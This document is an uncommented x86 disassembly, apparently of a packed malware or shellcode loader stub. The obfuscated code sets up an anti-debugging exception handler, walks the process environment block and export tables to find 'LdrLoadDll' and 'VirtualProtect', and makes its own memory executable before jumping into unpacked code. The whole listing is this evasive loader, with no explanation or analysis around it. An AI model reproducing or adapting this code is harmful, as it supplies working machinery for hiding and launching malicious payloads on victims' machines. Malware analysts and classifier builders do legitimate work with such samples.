_start
pushad
xor edi edi
push esp
test esi esi
adc edi 0x1
pop esi
or ebx ebx
adc edi 0x1
or esi esi
sbb esi 0x4
test ebx ebx
sbb edi 0xffffffff
neg edi
call $+5
sub [ esi ] edi
retn
sub_14a0202f
mov eax 0x0
or eax 0x0
mov ebx 0x0
sub ebx eax
neg ebx
sub edi edi
add edi eax
add bx 0xffff
dec bl
mov bh bl
call $+5
and ebx ebx
adc edi 0x1
sub ecx ecx
add ecx [ esp ]
movzx esi [ ecx + edi - 0x2 ]
add esp 0xfffffffc
mov [ esp ] ebx
test edx edx
sbb ebx esi
pop ebx
jne r-xdata
add [ esp ] eax
jmp [ esp ]
mov eax 0x0
or eax edi
sub_14a020b9
push [ fs : 0x0 ]
and ebx ebx
adc ebx esi
and ecx 0x0
add ecx 0xffff
not edx
test ebx ebx
adc ebx esi
mov [ fs : 0x0 ] esp
and ebx edx
add ebx esi
and ecx ecx
jno r-xdata
call $+5
call sub_14a020b9
push edx
push [ esp + 0x10 ]
pop edx
add [ edx + 0xb8 ] 0x1
inc [ edx + 0xb8 ]
add esp 0x4
mov edx [ esp - 0x4 ]
xor eax eax
retn 0x10
pop edi
and edi 0x0
or edi [ esp ]
mov [ fs : 0x0 ] edi
or ebx ebx
adc esp 0x8
sub esi esi
add esi ebx
push [ ebx + 0x3c ]
pop edi
add ebx edi
and edi 0x0
add edi 0x4550
and eax 0x0
or eax [ ebx ]
push edi
and ecx ecx
sbb edi eax
pop edi
jne r-xdata
jmp [ esp ]
popad
and eax 0x0
or eax 0x1
retn 0xc
mov edi 0x0
xor edi [ ebx + 0x78 ]
and ebx 0x0
add ebx edi
add ebx esi
call $+5
mov [ esp ] ebx
mov edi 0x0
or edi [ ebx + 0x20 ]
mov ebx 0x0
or ebx edi
and ebx ebx
adc ebx esi
call $+5
mov [ esp ] esi
push ebx
add esp 0x4
mov esi [ esp - 0x4 ]
mov ebx [ esp ]
add esp 0x4
xor edx edx
mov eax esi
xor ecx ecx
add ecx [ esi ]
and eax eax
mov esi 0x0
adc esi ecx
call $+5
xor ebp ebp
add ebp esp
add esi ebx
call $+5
mov [ esp ] 0x6c6c
call $+5
mov [ esp ] 0x4464616f
sub esp 0x4
mov [ esp ] 0x4c72644c
and edi edi
mov edi 0x0
adc edi esp
xor ecx ecx
xor ecx 0xb
[ esi ] [ edi ]
je r-xdata
or edi edi
sbb ebx esi
xor edi edi
mov edi [ ebx ]
and eax 0x0
or eax 0x5a4d
and edi ecx
add esp 0xfffffffc
mov [ esp ] eax
sub eax edi
pop eax
je r-xdata
and esp 0x0
or esp ebp
mov esi [ esp ]
add esp 0x4
add esp 0xfffffffc
mov [ esp ] ebx
push edx
add esp 0x4
mov edx [ esp - 0x4 ]
pop esi
pop ebx
xor ecx ecx
or ecx ebx
mov edi 0x0
xor edi [ ebx + 0x24 ]
and ebx 0x0
or ebx edi
add ebx esi
push [ ebx + edx * 2 ]
pop edi
and edi 0xffff
mov edx 0x0
or edx edi
mov edi 0x0
xor edi [ ecx + 0x10 ]
sub edx edi
and edi edi
sbb edx 0xffffffff
mov ebx 0x0
or ebx [ ecx + 0x1c ]
add ebx esi
mov edi [ ebx + edx * 4 ]
add esi edi
mov ebp 0x0
sub ebp esp
neg ebp
sub esp 0x4
mov [ esp ] edi
xor edi [ esp ]
and ecx ecx
adc esp 0x4
call $+5
mov [ esp ] edi
and ebx 0x0
add ebx esp
add esp 0xfffffffc
mov [ esp ] edi
add esp 0xfffffffc
mov [ esp ] 0x6c006c
call $+5
mov [ esp ] 0x64002e
sub esp 0x4
mov [ esp ] 0x320033
add esp 0xfffffffc
mov [ esp ] 0x6c0065
sub esp 0x4
mov [ esp ] 0x6e0072
add esp 0xfffffffc
mov [ esp ] 0x65006b
push esp
call $+5
mov [ esp ] 0x1a0018
push esp
pop eax
push ebx
add esp 0xfffffffc
mov [ esp ] eax
push edi
call $+5
mov [ esp ] edi
add esp 0xfffffffc
mov [ esp ] esi
push ebx
add esp 0x4
mov esi [ esp - 0x4 ]
add esp 0x4
mov ebx [ esp - 0x4 ]
call ebx
and eax 0x0
add eax [ esi ]
call $+5
mov [ esp ] eax
pop edi
and eax 0x0
or eax [ fs : 0x30 ]
xor esi esi
xor esi [ eax + 0x10 ]
mov [ esi + 0x18 ] edi
and esp 0x0
add esp ebp
mov eax 0x0
add eax [ fs : 0x30 ]
mov esi [ eax + 0x10 ]
sub ebx ebx
add ebx [ esi + 0x18 ]
mov esi 0x0
xor esi ebx
xor edi edi
or edi [ ebx + 0x3c ]
add ebx edi
xor edi edi
add edi [ ebx + 0x78 ]
sub ebx ebx
add ebx edi
add ebx esi
add esp 0xfffffffc
mov [ esp ] ebx
push [ ebx + 0x20 ]
pop edi
mov ebx 0x0
xor ebx edi
add ebx esi
sub esp 0x4
mov [ esp ] esi
push ebx
mov esi [ esp ]
add esp 0x4
mov ebx [ esp ]
add esp 0x4
push edx
xor edx [ esp ]
sub esp 0xfffffffc
xor eax eax
xor eax esi
and ecx 0x0
or ecx [ esi ]
mov esi 0x0
xor esi ecx
call $+5
xor ebp ebp
add ebp esp
and edi edi
adc esi ebx
sub esp 0x4
mov [ esp ] 0x7463
add esp 0xfffffffc
mov [ esp ] 0x65746f72
add esp 0xfffffffc
mov [ esp ] 0x506c6175
push 0x74726956
mov edi 0x0
xor edi esp
and ecx 0x0
or ecx 0xf
[ esi ] [ edi ]
je r-xdata
and ecx ecx
sbb edx 0xffffffff
add eax 0x4
and esi esi
mov esi 0x0
adc esi [ eax ]
mov esp 0x0
xor esp ebp
jmp [ esp ]
sub esp esp
add esp ebp
add esp 0x4
mov esi [ esp - 0x4 ]
sub esp 0x4
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] edx
mov edx [ esp ]
add esp 0x4
mov esi [ esp ]
add esp 0x4
pop ebx
and ecx 0x0
add ecx ebx
mov edi [ ebx + 0x24 ]
xor ebx ebx
add ebx edi
test esi esi
adc ebx esi
and edi 0x0
or edi [ ebx + edx * 2 ]
and edi 0xffff
xor edx edx
add edx edi
and edi 0x0
add edi [ ecx + 0x10 ]
sub edx edi
inc edx
and ebx 0x0
or ebx [ ecx + 0x1c ]
add ebx esi
mov edi 0x0
add edi [ ebx + edx * 4 ]
add esi edi
and ecx 0x0
or ecx 0x1000
call $+5
pop ebx
and ebx 0xfffff000
add ebx ecx
add ebx ecx
sub esp 0x4
mov [ esp ] ebx
test edi edi
mov eax 0x0
adc eax 0x4
call $+5
add ebx ecx
xor edi edi
xor edi [ ebx ]
stc
sbb eax 0x0
je r-xdata
inc edx
and edx edx
adc eax 0x4
mov esi 0x0
sub esi [ eax ]
neg esi
xor esp esp
xor esp ebp
jmp [ esp ]
pop edi
add esp 0x4
mov ebx [ esp - 0x4 ]
add esp 0xfffffffc
mov [ esp ] edi
push esp
call $+5
mov [ esp ] 0x40
add esp 0xfffffffc
mov [ esp ] 0x45f1
add esp 0xfffffffc
mov [ esp ] ebx
add esp 0xfffffffc
mov [ esp ] esi
call $+5
mov [ esp ] ebx
add esp 0x4
mov esi [ esp - 0x4 ]
add esp 0x4
mov ebx [ esp - 0x4 ]
call $+5
pop eax
or esi esi
adc eax 0x1b
push eax
call $+5
mov [ esp ] ebp
and ebp 0x0
or ebp esp
and esi esi
adc ebx 0x5
jmp ebx
jmp [ esp ]
